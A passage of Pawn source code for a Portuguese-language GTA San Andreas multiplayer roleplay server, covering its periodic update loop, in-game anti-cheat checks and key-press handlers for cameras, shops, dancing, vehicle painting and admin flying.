		new Float:vPos[3], Float:dis, Float:X, Float:Y, Float:Z, Float:fX, Float:fY, Float:ang;

		GetVehiclePos(TuneData[1], vPos[0], vPos[1], vPos[2]);
		X = 615.0339;
		Y = -3.8868;
		Z = 1001.0250;
		dis = GetDistance(vPos[0], vPos[1], vPos[2], X, Y, Z);

		if(GetPlayerInterior(TuneData[0]) != 1 || dis > 3.0)
		{
		    SetPlayerInterior(TuneData[0], 1);
	    	LinkVehicleToInterior(TuneData[1], 1);
			SetPlayerPos(TuneData[0], 608.7222, -24.7236, 1000.9203);
			SetVehiclePos(TuneData[1], X, Y, Z);
			SetVehicleZAngle(TuneData[1], 270.2918);
			TogglePlayerControllable(TuneData[0], false);
		}

		GetPlayerFacingAngle(TuneData[0], ang);
		fX = X + (7.5 * floatsin(-ang, degrees));
		fY = Y + (7.5 * floatcos(-ang, degrees));
		SetPlayerCameraPos(TuneData[0], fX, fY, Z + 1.0);
		SetPlayerCameraLookAt(TuneData[0], X, Y, Z);
		SetPlayerFacingAngle(TuneData[0], ang + 0.3);
	}
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Dying[n] == 0)
	    {
	        if(PlayerEvent[n] != PLAYER_EVENT_NULL)
	        {
				if(PlayerEvent[n] & PLAYER_EVENT_ROPE)
				{
				    new vehicleid;
				    new Float:PX, Float:PY, Float:PZ, Float:VX, Float:VY, Float:VZ;

					vehicleid = RopeHeli[n];
					GetPlayerPos(n, PX, PY, PZ);
	    			GetPlayerVelocity(n, VX, VY, VZ);
	    			SetVehicleVelocity(vehicleid, 0.0, 0.0, 0.0);
					SetVehiclePos(vehicleid, RopeHeliPos[n][0], RopeHeliPos[n][1], RopeHeliPos[n][2]);

					if((RopeHeliPos[n][2] - PZ > (ROPES + 1) * ROPE_HEIGHT) || (VZ == 0.0 && RopeCount[n] > 10))
					{
				    	ClearAnimations(n);

		   	 			for(new r = 0; r < ROPES; r++)
	    				{
	        				DestroyObject(Ropes[n][r]);
							Ropes[n][r] = -1;
						}
						
						RopeCount[n] = 0;
						PlayerEvent[n] &= ~PLAYER_EVENT_ROPE;
					}

					else
					{
	 					SetPlayerVelocity(n, VX, VY, -0.25);
	 					RopeCount[n]++;
					}
				}
				
				if(PlayerEvent[n] & PLAYER_EVENT_HOLDING)
				{
				    new plid;
                    new Float:PX, Float:PY, Float:PZ, Float:CX, Float:CY, Float:CZ, Float:A;

					plid = HoldId[n];
					
					if(!IsPlayerConnected(plid) || !IsPlayerLogged(plid))
					{
	    				ClearAnimations(plid);
	    				HoldId[n] = -1;
	    				PlayerEvent[n] &= ~PLAYER_EVENT_HOLDING;
	    				continue;
					}

					if(IsPlayerInAnyVehicle(n))
					{
	    				new vehid, model;

	    				vehid = GetPlayerVehicleID(n);

					    if(!IsPlayerInVehicle(plid, vehid))
	    				{
	    					if(IsJobVehicle(vehid, POLICE_CAR))
	    					{
								model = GetVehicleModel(vehid);

								if(model == 427 || model == 490 || model == 497 || model == 596 || model == 597 || model == 598)
								    PutPlayerInVehicle(plid, vehid, random(2) + 2);

								else
								    PutPlayerInVehicle(plid, vehid, 1);
	    					}
						}
					}

					else
					{
	    				new animlib[64], animname[64];
						new animindex;

						animindex = GetPlayerAnimationIndex(plid);
	    				GetAnimationName(animindex, animlib, sizeof animlib, animname, sizeof animname);

						if(IsPlayerInAnyVehicle(plid))
						    RemovePlayerFromVehicle(plid);

						if(strcmp(animlib, "PED", false) != 0 || strcmp(animname, "WALK_csaw", false) != 0)
        					ApplyAnimation(plid, "PED", "WALK_csaw", 4.1, 1, 1, 1, 1, -1, 1);

						GetPlayerPos(plid, PX, PY, PZ);
						GetPlayerPos(n, CX, CY, CZ);

						if(GetPlayerInterior(n) != GetPlayerInterior(plid) || GetPlayerVirtualWorld(n) != GetPlayerVirtualWorld(plid) || Enter[n] != Enter[plid] || House[n] != House[plid])
						{
		    				Enter[plid] = Enter[n];
		    				House[plid] = House[n];
		    				SetPlayerInterior(plid, GetPlayerInterior(n));
		    				SetPlayerPos(plid, CX + 0.5, CY + 0.5, CZ);
		    				SetPlayerVirtualWorld(plid, GetPlayerVirtualWorld(n));
						}

						A = 180.0 - atan2(PX - CX, PY - CY);
						SetPlayerFacingAngle(plid, A);
					}
				}
				
				if(PlayerEvent[n] & PLAYER_EVENT_NEWS)
				{
				    new vehid;
				    new Float:CX, Float:CY, Float:CZ, Float:CA, Float:LX, Float:LY, Float:LZ;
				    
				    if(GetPlayerState(n) != PLAYER_STATE_PASSENGER || !IsPlayerInJobVehicle(n, NEWS) || GetVehicleModel(GetPlayerVehicleID(n)) != 488)
				    {
				        CameraStyle[n] = 0;
				        KeyEvent[n] &= ~KEY_EVENT_NEWS;
				        PlayerEvent[n] &= ~PLAYER_EVENT_NEWS;
				        SetCameraBehindPlayer(n);
				        continue;
				    }

			        vehid = GetPlayerVehicleID(n);
			        GetVehiclePos(vehid, CX, CY, CZ);
			        GetVehicleZAngle(vehid, CA);
						
					CX += 2.0 * floatsin(-(CA + 270.0), degrees);
					CY += 2.0 * floatcos(-(CA + 270.0), degrees);
					CZ -= 0.2;
					LX = CX, LY = CY, LZ = CZ;
						
					switch(CameraStyle[n])
					{
					    case 0:
					        LX += 50.0 * floatsin(-(CA + 270.0), degrees), LY += 50.0 * floatcos(-(CA + 270.0), degrees);
						        
						case 1:
						    LX += 20.0 * floatsin(-(CA + 315.0), degrees), LY += 20.0 * floatcos(-(CA + 315.0), degrees), LZ -= 10.0;

						case 2:
						    LX += 20.0 * floatsin(-(CA + 225.0), degrees), LY += 20.0 * floatcos(-(CA + 225.0), degrees), LZ -= 10.0;

						case 3:
						    LX += 20.0 * floatsin(-(CA + 270.0), degrees), LY += 20.0 * floatcos(-(CA + 270.0), degrees), LZ -= 50.0;
					}
						
					SetPlayerCameraPos(n, CX, CY, CZ);
					SetPlayerCameraLookAt(n, LX, LY, LZ);
			    }
			    
			    if(PlayerEvent[n] & PLAYER_EVENT_CHECKAREA)
				{
				    new plid;
					new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ, Float:OFF;
					
				    plid = CheckArea[n];
				    GangZoneDestroy(CheckAreaGangZone[n]);
				    RemovePlayerWantedPlayers(n);
					RemovePlayerWantedPlayers(plid);
					
				    if(plid == INVALID_PLAYER_ID || !IsPlayerConnected(n) || !IsPlayerConnected(plid) || !IsPlayerLogged(n) || !IsPlayerLogged(plid))
					{
					    if(plid != INVALID_PLAYER_ID)
					    {
					        CheckArea[plid] = INVALID_PLAYER_ID;
					        PlayerEvent[plid] &= ~PLAYER_EVENT_CHECKAREA;
					    }
					    
					    CheckArea[n] = INVALID_PLAYER_ID;
					    PlayerEvent[n] &= ~PLAYER_EVENT_CHECKAREA;
						continue;
					}
					
					if(!IsPlayerInAnyVehicle(n))
						GetPlayerPos(n, X, Y, Z);

					else
					    GetVehiclePos(GetPlayerVehicleID(n), X, Y, Z);

					if(!IsPlayerInAnyVehicle(plid))
						GetPlayerPos(plid, PX, PY, PZ);

					else
					    GetVehiclePos(GetPlayerVehicleID(plid), PX, PY, PZ);

					if(GetDistance(X, Y, Z, PX, PY, PZ) > 100.0)
					{
					    CheckArea[n] = CheckArea[plid] = INVALID_PLAYER_ID;
					    PlayerEvent[n] &= ~PLAYER_EVENT_CHECKAREA;
	        			PlayerEvent[plid] &= ~PLAYER_EVENT_CHECKAREA;
	        			SendClientMessage(n, COLOUR_SWAT, "Exame de área cancelado, você se afastou muito do outro jogador.");
	        			SendClientMessage(plid, COLOUR_SWAT, "Exame de área cancelado, você se afastou muito do outro jogador.");
						continue;
					}

					if(X < PX)
					{
		    			OFF = X;
						X = PX;
						PX = OFF;
					}

					if(Y < PY)
					{
		    			OFF = Y;
		    			Y = PY;
		    			PY = OFF;
					}
					
		            for(new p = 0; p < MAX_SLOTS; p++)
		            {
		                if(IsPlayerConnected(p) && IsPlayerLogged(p) && GetPlayerWantedLevel(p) > 0 && random(2) == 0)
		                {
		                    new Float:WX, Float:WY;
		                    
							GetPlayerWorldPos(p, WX, WY, OFF);
							
							if(WX >= X && WX <= PX && WY >= Y && WY <= PY)
							{
							    SetPlayerMapIcon(n, MAX_MAP_ICONS + WantedPlayers[n]++, Z, PZ, OFF, 0, COLOUR_RED);
							    SetPlayerMapIcon(plid, MAX_MAP_ICONS + WantedPlayers[plid]++, Z, PZ, OFF, 0, COLOUR_RED);
							}
		                }
		            }
		            
					CheckAreaGangZone[n] = CheckAreaGangZone[plid] = GangZoneCreate(X, Y, PX, PY);
					GangZoneShowForPlayer(n, CheckAreaGangZone[n], COLOUR_SWAT);
					GangZoneShowForPlayer(plid, CheckAreaGangZone[plid], COLOUR_SWAT);
				}
	        }
	        
			if(ArrowObject[n] != -1 && IsPlayerInAnyVehicle(n))
			{
			    new vehid;
			    new Float:X, Float:Y, Float:Z, Float:A, Float:D2D, Float:D3D;
			    
			    vehid = GetPlayerVehicleID(n);
			    GetVehiclePos(vehid, X, Y, Z);
			    GetVehicleZAngle(vehid, A);
			    D2D = GetDistance2D(X, Y, ArrowPointTo[n][0], ArrowPointTo[n][1]);
			    D3D = D2D + floatsqroot(floatpower(Z - ArrowPointTo[n][2], 2));
			    
				if(D3D < 10.0)
				{
					DestroyPlayerObject(n, ArrowObject[n]);
					ArrowObject[n] = -1;
					SendClientMessage(n, COLOUR_YELLOW, "Você chegou ao seu destino.");
				}
				
				else
				{
			    	SetPlayerObjectPos(n, ArrowObject[n], X + 4.0 * floatsin(-A, degrees), Y + 4.0 * floatcos(-A, degrees), Z + 1.75);
			    	SetPlayerObjectRot(n, ArrowObject[n], 0.0, 90.0 - atan2(Z - ArrowPointTo[n][2], -(D2D / 2)), 270.0 - atan2(X - ArrowPointTo[n][0], Y - ArrowPointTo[n][1]));
				}
			}
			
	        if(!IsPlayerAdmin(n))
			{
			    if(GetPlayerSpecialAction(n) == SPECIAL_ACTION_USEJETPACK)
			    {
			        BanAcc(n, "Jetpack");
			        continue;
			    }
			}
			
			if(IsPlayerAdmin(n) && AdminData[n][admPower] == 1)
			    continue;
            
            if(pUpdate[n] & UPDATE_HEALTH)
            {
                if(pHealth[n] < 1.0)
                    pHealth[n] = 1.0;
                    
                if(pHealth[n] > 100.0)
                    pHealth[n] = 100.0;
                    
				if(pArmour[n] > 100.0)
				    pArmour[n] = 100.0;
                    
                SetPlayerHealth(n, pHealth[n]);
                SetPlayerArmour(n, pArmour[n]);
                pUpdate[n] &= ~UPDATE_HEALTH;
            }
            
            else
            {
                new Float:health, Float:armour;
                
                GetPlayerHealth(n, health);
                GetPlayerArmour(n, armour);
                
                if(floatcmp(health, pHealth[n]) > 0)
                {
                    reportf("%s - Vida +%.2f", REPORT_ACTION, PlayerName(n), health - pHealth[n]);
                    SetPlayerHealth(n, pHealth[n]);
                }
                
                if(floatcmp(armour, pArmour[n]) > 0)
                {
                    reportf("%s - Colete +%.2f", REPORT_ACTION, PlayerName(n), armour - pArmour[n]);
                    SetPlayerArmour(n, pArmour[n]);
                }
            }
            
            if(pUpdate[n] & UPDATE_MONEY)
            {
                GivePlayerMoney(n, -GetPlayerMoney(n) + pMoney[n]);
                pUpdate[n] &= ~UPDATE_MONEY;
            }
            
            else
            {
				new money;

				money = GetPlayerMoney(n);
			
    			if(pMoney[n] != money)
    			{
					new sub;
				
					sub = money - pMoney[n];
				
					if(sub > 0)
    		    		reportf("%s - Dinheiro +$%d,00", REPORT_ACTION, PlayerName(n), sub);
    		    	
					else
					    reportf("%s - Dinheiro -$%d,00", REPORT_ACTION, PlayerName(n), -sub);
				    
    		    	GivePlayerMoney(n, -money + pMoney[n]);
    			}
			}
    
            if(pUpdate[n] & UPDATE_WEAPONS)
            {
				ResetPlayerWeapons(n);
				GivePlayerWeapon(n, pWeapons[n][0], pWeapons[n][1]);
				GivePlayerWeapon(n, pWeapons[n][2], pWeapons[n][3]);
				GivePlayerWeapon(n, pWeapons[n][4], 1);
				SetPlayerArmedWeapon(n, 0);
				Weapon[n] = 0;
				AttachPlayerHandgun(n);
                pUpdate[n] &= ~UPDATE_WEAPONS;
            }
            
            else
            {
            	new weaponid, ammo;
            
            	weaponid = GetPlayerWeapon(n);
                ammo = GetPlayerAmmo(n);
                
                if(!IsPlayerAdmin(n) && IsForbiddenWeapon(weaponid))
				{
	    			new str[128];
	    			format(str, sizeof str, "Posse de arma proibida [%s - ID: %d]", Weapons[weaponid][wName], weaponid);
	    			BanAcc(n, str);
	    			continue;
				}
	
	            if(weaponid != 0)
	            {
					if(pWeapons[n][0] != weaponid && pWeapons[n][2] != weaponid && pWeapons[n][4] != weaponid)
					{
					    reportf("%s - Arma +%d/%d", REPORT_ACTION, PlayerName(n), weaponid, ammo);
					    pUpdate[n] |= UPDATE_WEAPONS;
					}
				
					else if(pWeapons[n][0] == weaponid)
					{
					    if(pWeapons[n][1] < ammo)
					    {
					        reportf("%s - Arma +%d/%d", REPORT_ACTION, PlayerName(n), weaponid, ammo - pWeapons[n][1]);
					        pUpdate[n] |= UPDATE_WEAPONS;
					    }
					}
				
					else if(pWeapons[n][2] == weaponid)
					{
					    if(pWeapons[n][3] < ammo)
					    {
					        reportf("%s - Arma +%d/%d", REPORT_ACTION, PlayerName(n), weaponid, ammo - pWeapons[n][3]);
					        pUpdate[n] |= UPDATE_WEAPONS;
					    }
					}
				}
				
				if(Weapon[n] == -1 || (weaponid != Weapon[n] && weaponid != 119))
				{
				    if(Weapon[n] == -1)
				        Weapon[n] = 0;
			        
			        Weapon[n] = weaponid;
                    SavePlayerWeapons(n);
					AttachPlayerHandgun(n);
				}
			}
		}
	}
	
	for(new g = 0; g < sizeof Gates; g++)
	{
	    new open, status;
	    
	    open = (Gates[g][gParams] >> 1) & 0x1;
		status = Gates[g][gParams] & 0x1;
	    
		if(status == 1)
		{
	    	switch(Gates[g][gStyle])
	    	{
				case 2:
				{
					if(open == 1)
					{
					    new Float:rX, Float:rY, Float:rZ;

	        			GetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
						rX -= 1.0;

						if(rX <= Gates[g][gRX] - 90.0)
						{
			    			Gates[g][gParams] = (1 << 1) | 0;
						    SetObjectRot(Gates[g][gObjectId], Gates[g][gRX] - 90.0, Gates[g][gRY], Gates[g][gRZ]);
						}

						else
			    			SetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
					}
					
					else
					{
					    new Float:rX, Float:rY, Float:rZ;

	        			GetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
						rX += 1.0;

						if(rX >= Gates[g][gRX])
						{
			    			Gates[g][gParams] = (0 << 1) | 0;
			    			SetObjectRot(Gates[g][gObjectId], Gates[g][gRX], Gates[g][gRY], Gates[g][gRZ]);
						}

						else
			    			SetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
					}
				}

				case 3:
				{
					if(open == 1)
					{
                        new Float:rX, Float:rY, Float:rZ;

	        			GetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
						rY += 1.0;

						if(rY >= Gates[g][gRY] + 90.0)
						{
			    			Gates[g][gParams] = (1 << 1) | 0;
			    			SetObjectRot(Gates[g][gObjectId], Gates[g][gRX], Gates[g][gRY] + 90.0, Gates[g][gRZ]);
						}

						else
			    			SetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
					}
					
					else
					{
                        new Float:rX, Float:rY, Float:rZ;

	        			GetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
						rY -= 1.0;

						if(rY <= Gates[g][gRY])
						{
			    			Gates[g][gParams] = (0 << 1) | 0;
			    			SetObjectRot(Gates[g][gObjectId], Gates[g][gRX], Gates[g][gRY], Gates[g][gRZ]);
						}

						else
						    SetObjectRot(Gates[g][gObjectId], rX, rY, rZ);
					}
				}
		    }
		}
	}
	    
	UpdateTime = GetTickCount() - start;
}

public OnPlayerPressedKey(playerid, key, up_down, left_right)
{
	if(KeyEvent[playerid] & KEY_EVENT_CAMERA)
	{
	    new camid, objectid;
		new Float:X, Float:Y, Float:Z, Float:RX, Float:RY, Float:RZ;

		if(up_down == 0 && left_right == 0)
		    return;

		camid = SecCamera[playerid];
		objectid = SecurityCameras[camid][secObjectId];
		GetObjectPos(objectid, X, Y, Z);
		GetObjectRot(objectid, RX, RY, RZ);

		if(up_down == KEY_UP)
		{
		    if(SecurityCameras[camid][secZoom] + 1.0 < 15.0)
		        SecurityCameras[camid][secZoom] += 1.0;
		}

		if(up_down == KEY_DOWN)
		{
		    if(SecurityCameras[camid][secZoom] - 1.0 > -1.0)
		        SecurityCameras[camid][secZoom] -= 1.0;
		}

		if(left_right == KEY_LEFT)
		{
		    if(RZ + 2.5 < SecurityCameras[camid][secRZ] + 45.0)
		    	RZ += 2.5;
		}

		if(left_right == KEY_RIGHT)
		{
		    if(RZ - 2.5 > SecurityCameras[camid][secRZ] - 45.0)
		    	RZ -= 2.5;
		}

		SetObjectRot(objectid, RX, RY, RZ);

		X += SecurityCameras[camid][secZoom] * floatsin(-RZ, degrees);
		Y += SecurityCameras[camid][secZoom] * floatcos(-RZ, degrees);
		Z -= SecurityCameras[camid][secZoom] / 2.0;

		SetPlayerCameraPos(playerid, X, Y, Z);
		SetPlayerCameraLookAt(playerid, X + 50.0 * floatsin(-RZ, degrees), Y + 50.0 * floatcos(-RZ, degrees), Z - 20.0);
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_WINDOW)
	{
		new Float:X, Float:Y, Float:Z, Float:A;

		if(up_down == 0 && left_right == 0)
		    return;

		GetPlayerPos(playerid, X, Y, Z);
	 	GetPlayerFacingAngle(playerid, A);
		Z += 50.0;

		if(up_down == KEY_UP)
		{
	    	if(Window[playerid][wndLookZ] < 10.0)
				Window[playerid][wndLookZ] += 0.5;
		}

		if(up_down == KEY_DOWN)
		{
 			if(Window[playerid][wndLookZ] > -10.0)
				Window[playerid][wndLookZ] -= 0.5;
		}

		if(left_right == KEY_LEFT)
		{
	    	if(Window[playerid][wndLookA] < 90.0)
				Window[playerid][wndLookA] += 2.0;
		}

		if(left_right == KEY_RIGHT)
		{
	 		if(Window[playerid][wndLookA] > -90.0)
				Window[playerid][wndLookA] -= 2.0;
		}

		SetPlayerFacingAngle(playerid, A);
		SetPlayerCameraPos(playerid, X, Y, Z);
		SetPlayerCameraLookAt(playerid, X + 2.0 * floatsin(-(A + Window[playerid][wndLookA]), degrees), Y + 2.0 * floatcos(-(A + Window[playerid][wndLookA]), degrees), Z + Window[playerid][wndLookZ]);
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_CLOTHES)
	{
        new clothes, cstype;

	    clothes = ClothesShop[playerid][csId];
	    cstype = ClothesShop[playerid][csType];

		if(key & KEY_SPRINT)
		{
		    if(ClothesShop[playerid][csOpt] == OPTION_BUY)
		    {
				if(GetPlayerSysMoney(playerid) < Clothes[clothes][1])
				{
				    DrawTextForPlayer(playerid, "Dinheiro insuficiente.", COLOUR_RED, TEXTDRAW_STYLE_3, 1500);
				    return;
				}

				GivePlayerSysMoney(playerid, -Clothes[clothes][1]);
				hSetInt(GetPlayerXFilePath(playerid), "Skin", clothes);
		    }

		    HideClothes(playerid);
		    return;
		}

		if(up_down != 0)
		{
			if(ClothesShop[playerid][csOpt] == OPTION_BUY)
			{
			    TextDrawHideForPlayer(playerid, tdclothes[0]);
			    TextDrawShowForPlayer(playerid, tdclothes[1]);
			    ClothesShop[playerid][csOpt] = OPTION_CANCEL;
			}

			else
			{
			    TextDrawHideForPlayer(playerid, tdclothes[1]);
			    TextDrawShowForPlayer(playerid, tdclothes[0]);
			    ClothesShop[playerid][csOpt] = OPTION_BUY;
			}
		}

		if(left_right == KEY_LEFT)
		{
		    ClothesShop[playerid][csId] = -1;

		    for(new n = clothes - 1; n > -1; n--)
	 		{
				if(IsValidSkin(n) && Clothes[n][0] == cstype)
				{
					ClothesShop[playerid][csId] = n;
					break;
				}
	  		}

			if(ClothesShop[playerid][csId] == -1)
	 		{
	  			for(new n = sizeof Clothes; n > clothes; n--)
	    		{
	     			if(IsValidSkin(n) && Clothes[n][0] == cstype)
					{
						ClothesShop[playerid][csId] = n;
						break;
					}
	   			}
	   		}

	   		SetPlayerSkin(playerid, ClothesShop[playerid][csId]);
		}

		if(left_right == KEY_RIGHT)
		{
		    ClothesShop[playerid][csId] = -1;

		    for(new n = clothes + 1; n < sizeof Clothes; n++)
 			{
				if(IsValidSkin(n) && Clothes[n][0] == cstype)
				{
					ClothesShop[playerid][csId] = n;
					break;
				}
	  		}

			if(ClothesShop[playerid][csId] == -1)
	 		{
	  			for(new n = 0; n < clothes; n++)
	    		{
	     			if(IsValidSkin(n) && Clothes[n][0] == cstype)
					{
						ClothesShop[playerid][csId] = n;
						break;
					}
	   			}
	   		}

	   		SetPlayerSkin(playerid, ClothesShop[playerid][csId]);
		}
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_DANCING)
	{
        if(key & KEY_SECONDARY_ATTACK)
		{
			KeyEvent[playerid] &= ~KEY_EVENT_DANCING;
		    TogglePlayerControllable(playerid, true);
		    ClearAnimations(playerid);
		    return;
		}

		if(up_down != 0)
		{
		    new rand;
		    
		    KeyEvent[playerid] &= ~KEY_EVENT_DANCING;

			if(up_down == KEY_UP)
			{
		    	rand = random(2);

		    	switch(rand)
		    	{
		    	    case 0:
		            	ApplyAnimation(playerid, "DANCING", "bd_clap", 4.1, 0, 1, 1, 1, 1, 1);

					case 1:
				    	ApplyAnimation(playerid, "DANCING", "bd_clap1", 4.1, 0, 1, 1, 1, 1, 1);
		    	}

		    	SetTimerEx("RestartDance", 2700, false, "d", playerid);
			}
			
			else
			{
			    rand = random(4);

			    switch(rand)
		    	{
					case 0:
					    ApplyAnimation(playerid, "DANCING", "DAN_Left_A", 4.1, 0, 1, 1, 1, 1, 1);

					case 1:
					    ApplyAnimation(playerid, "DANCING", "DAN_Down_A", 4.1, 0, 1, 1, 1, 1, 1);

					case 2:
	        	    	ApplyAnimation(playerid, "DANCING", "DAN_Right_A", 4.1, 0, 1, 1, 1, 1, 1);

					case 3:
						ApplyAnimation(playerid, "DANCING", "DAN_Up_A", 4.1, 0, 1, 1, 1, 1, 1);
		    	}

		    	SetTimerEx("RestartDance", 1000, false, "d", playerid);
			}

		    return;
		}

		if(left_right != 0)
		{
		    if(left_right == KEY_RIGHT)
		    	DanceStyle[playerid] = (DanceStyle[playerid] + 1) % 7;
			else
			    DanceStyle[playerid] = (DanceStyle[playerid] - 1) % 7;

		    switch(DanceStyle[playerid])
		    {
		        case 0:
		            ApplyAnimation(playerid, "DANCING", "dnce_M_d", 4.1, 1, 1, 1, 1, -1, 1);

				case 1:
				    ApplyAnimation(playerid, "DANCING", "dance_loop", 4.1, 1, 1, 1, 1, -1, 1);

				case 2:
				    ApplyAnimation(playerid, "DANCING", "dnce_M_a", 4.1, 1, 1, 1, 1, -1, 1);

				case 3:
				    ApplyAnimation(playerid, "DANCING", "dnce_M_b", 4.1, 1, 1, 1, 1, -1, 1);

				case 4:
				    ApplyAnimation(playerid, "DANCING", "dnce_M_c", 4.1, 1, 1, 1, 1, -1, 1);

				case 5:
				    ApplyAnimation(playerid, "DANCING", "dnce_M_e", 4.1, 1, 1, 1, 1, -1, 1);

				case 6:
				    ApplyAnimation(playerid, "DANCING", "DAN_Loop_A", 4.1, 1, 1, 1, 1, -1, 1);
		    }
		}
		
		return;
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_STRIPPING)
	{
   	    if(key & KEY_SECONDARY_ATTACK)
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_STRIPPING;
		    TogglePlayerControllable(playerid, true);
		    ClearAnimations(playerid);
		    return;
		}

		if(up_down == KEY_UP)
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_STRIPPING;
		    ApplyAnimation(playerid, "STRIP", "STR_C2", 4.1, 0, 1, 1, 1, 1, 1);
			SetTimerEx("RestartStripTease", 5000, false, "d", playerid);
			return;
		}

		if(up_down == KEY_DOWN)
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_STRIPPING;
		    ApplyAnimation(playerid, "STRIP", "STR_A2B", 4.1, 0, 1, 1, 1, 1, 1);
			SetTimerEx("RestartStripTease", 4500, false, "d", playerid);
			return;
		}

		if(left_right == KEY_LEFT)
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_STRIPPING;
		    ApplyAnimation(playerid, "STRIP", "STR_C1", 4.1, 0, 1, 1, 1, 1, 1);
			SetTimerEx("RestartStripTease", 5500, false, "d", playerid);
			return;
		}

		if(left_right == KEY_RIGHT)
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_STRIPPING;
		    ApplyAnimation(playerid, "STRIP", "STR_B2C", 4.1, 0, 1, 1, 1, 1, 1);
			SetTimerEx("RestartStripTease", 5000, false, "d", playerid);
			return;
		}

		ApplyAnimation(playerid, "STRIP", "STR_Loop_A", 4.1, 1, 1, 1, 1, -1, 1);
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_PAINTING)
	{
        new colours[2], vehicleid, stage;

        vehicleid = PaintVehicle[playerid];
        
		if(!IsPlayerInVehicle(playerid, vehicleid))
		{
		    KeyEvent[playerid] &= ~KEY_EVENT_PAINTING;
		    PaintVehicle[playerid] = -1;
		    PaintStage[playerid] = 0;
			GetVehicleColours(vehicleid, colours[0], colours[1]);
			ChangeVehicleColour(vehicleid, colours[0], colours[1]);
		    TextDrawHideForPlayer(playerid, tdarrows);
		    return;
		}
		
		if(left_right != 0)
		{
		    stage = PaintStage[playerid];
		    colours[0] = (PaintColours[playerid] >> 16) & 0xFFFF;
			colours[1] = (PaintColours[playerid] & 0xFFFF);
		    
			if(left_right == KEY_RIGHT)
				colours[stage] = (colours[stage] + 1) % 300;

			if(left_right == KEY_LEFT)
			    colours[stage] = (colours[stage] - 1) % 300;

			PaintColours[playerid] = ((colours[0] & 0xFFFF) << 16) | (colours[1] & 0xFFFF);
		    ChangeVehicleColour(vehicleid, colours[0], colours[1]);
		}

		if(key & KEY_SPRINT)
		{
		    PaintStage[playerid]++;
			PlayerPlaySound(playerid, 1134, 0.0, 0.0, 0.0);

			if(PaintStage[playerid] >= sizeof colours)
			{
			    VFrozenFlags[playerid] &= ~VFROZEN_PAINT;

			    if(VFrozenFlags[playerid] == 0)
			        TogglePlayerControllable(playerid, true);

				if((IsPlayerAdmin(playerid) || hGetInt(GetPlayerXFilePath(playerid), "Job") == JOB_MECHANIC) && Area[playerid] != AREA_CUSTOM_SHOP)
                	SendClientMessage(playerid, COLOUR_MECHANIC, "Veículo pintado, peça para o jogador usar /pagar");
                
                else
                    GivePlayerSysMoney(playerid, -100);
                    
				KeyEvent[playerid] &= ~KEY_EVENT_PAINTING;
			    PaintStage[playerid] = 0;
			    SetVehicleColoursEx(vehicleid, PaintColours[playerid]);
			    TextDrawHideForPlayer(playerid, tdarrows);
		    	return;
			}
		}
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_FLYING)
	{
		new Float:ppos[4];
		
		GetPlayerPos(playerid, ppos[0], ppos[1], ppos[2]);
		GetPlayerFacingAngle(playerid, ppos[3]);

		if(key & KEY_ANALOG_LEFT)
		    SetPlayerFacingAngle(playerid, ppos[3] + 10.0);

		if(key & KEY_ANALOG_RIGHT)
		    SetPlayerFacingAngle(playerid, ppos[3] - 10.0);

		if(key & KEY_CROUCH)
		    SetPlayerPos(playerid, ppos[0], ppos[1], ppos[2] - 3.0);

		if(key & KEY_JUMP)
		    SetPlayerPos(playerid, ppos[0], ppos[1], ppos[2] + 3.0);

		if(up_down == KEY_UP)
		    SetPlayerPos(playerid, ppos[0] + 5.0 * floatsin(-ppos[3], degrees), ppos[1] + 5.0 * floatcos(-ppos[3], degrees), ppos[2]);

		if(up_down == KEY_DOWN)
		    SetPlayerPos(playerid, ppos[0] - 5.0 * floatsin(-ppos[3], degrees), ppos[1] - 5.0 * floatcos(-ppos[3], degrees), ppos[2]);

		if(left_right == KEY_LEFT)
		    SetPlayerPos(playerid, ppos[0] + 5.0 * floatsin(-(ppos[3] + 90.0), degrees), ppos[1] + 5.0 * floatcos(-(ppos[3] + 90.0), degrees), ppos[2]);

		if(left_right == KEY_RIGHT)
		    SetPlayerPos(playerid, ppos[0] - 5.0 * floatsin(-(ppos[3] + 90.0), degrees), ppos[1] - 5.0 * floatcos(-(ppos[3] + 90.0), degrees), ppos[2]);

	    switch(AdminData[playerid][admFly])
		{
	    	case 1: ApplyAnimation(playerid, "PARACHUTE", "FALL_SkyDive_Accel", 4.1, 0, 1, 1, 1, 150, 1);
		    case 2: ApplyAnimation(playerid, "PARACHUTE", "PARA_steerL", 4.1, 0, 1, 1, 1, 150, 1);
		    case 3: ApplyAnimation(playerid, "PARACHUTE", "PARA_steerR", 4.1, 0, 1, 1, 1, 150, 1);
		}

		SetCameraBehindPlayer(playerid);
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_NEWS)
	{
	    if(left_right == KEY_LEFT)
			CameraStyle[playerid] = (CameraStyle[playerid] - 1) % 4;
			
		if(left_right == KEY_RIGHT)
		    CameraStyle[playerid] = (CameraStyle[playerid] + 1) % 4;
	}
	
	if(KeyEvent[playerid] & KEY_EVENT_DJ)
	{
	    if(left_right != 0)
		{
		    if(Submission[SUBMISSION_DJ] == playerid && GetTickCount() >= DiscoTickCount + TMUSIC)
		    {
		        if(left_right == KEY_LEFT)
		        	CurrentSong = (CurrentSong - 1) % sizeof DiscoSongs;
		        	
                if(left_right == KEY_RIGHT)
                    CurrentSong = (CurrentSong + 1) % sizeof DiscoSongs;
                    
				if(!DiscoTimer)
			    	DiscoTimer = SetTimer("DiscoDJ", 30000, false);
			    	
				StartPlayingDiscoSong(CurrentSong);
		    }
		    
